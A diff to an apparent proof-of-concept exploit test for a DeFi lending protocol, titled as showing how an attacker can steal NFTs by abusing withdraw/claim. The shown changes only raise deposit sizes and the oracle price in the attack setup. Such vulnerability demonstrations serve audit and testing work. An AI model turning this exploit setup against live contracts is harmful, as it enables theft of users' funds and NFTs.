@@ -25,15 +25,15 @@ describe('an attacker can steal NFTs by abusing withdraw/claim', async () => {
     } = await setupTestSuite();
 
     /* ----------- cause Alice to deposit 6 ETH to the senior tranche ----------- */
-    // deposit 1 ETH to junior
-    const initialJuniorDeposit = ethers.utils.parseEther('3');
-    // deposit 6 ETH to senior
-    const initialSeniorDeposit = ethers.utils.parseEther('6');
+    // deposit 3k ETH to junior
+    const initialJuniorDeposit = ethers.utils.parseEther('3000');
+    // deposit 6k ETH to senior
+    const initialSeniorDeposit = ethers.utils.parseEther('6000');
     // alice will do the deposit.
     const aSigner = await ethers.getSigner(alice);
     await weth
       .connect(aSigner)
-      .deposit({ value: ethers.utils.parseEther('100') });
+      .deposit({ value: ethers.utils.parseEther('10000') });
     await weth.connect(aSigner).approve(voyage.address, MAX_UINT_256);
     const aVoyage = voyage.connect(aSigner);
     await aVoyage.deposit(crab.address, 0, initialJuniorDeposit, {
@@ -68,10 +68,10 @@ describe('an attacker can steal NFTs by abusing withdraw/claim', async () => {
       value: ethers.utils.parseEther('100'),
     });
     await bWeth.deposit({ value: ethers.utils.parseEther('100000') });
-    await bWeth.transfer(bVaultAddress, ethers.utils.parseEther('5'));
+    await bWeth.transfer(bVaultAddress, ethers.utils.parseEther('3000'));
     await bWeth.approve(bVaultAddress, MAX_UINT_256);
     // set the to 9 ETH
-    await priceOracle.updateTwap(crab.address, ethers.utils.parseEther('9'));
+    await priceOracle.updateTwap(crab.address, ethers.utils.parseEther('3000'));
 
     const provider = new ethers.providers.AlchemyProvider(
       'rinkeby',
@@ -134,10 +134,10 @@ describe('an attacker can steal NFTs by abusing withdraw/claim', async () => {
     );
 
     /* ----------------- have Bob deposit a large amount of WETH ---------------- */
-    await bWeth.deposit({ value: ethers.utils.parseEther('500') });
+    await bWeth.deposit({ value: ethers.utils.parseEther('1000000') });
     await bWeth.approve(voyage.address, MAX_UINT_256);
     // deposit ~10x totalAssets()
-    const bDeposit = ethers.utils.parseEther('500');
+    const bDeposit = ethers.utils.parseEther('1000000');
     await bVoyage.deposit(crab.address, 1, bDeposit);
     console.log('----after deposit----\n');
     console.log(
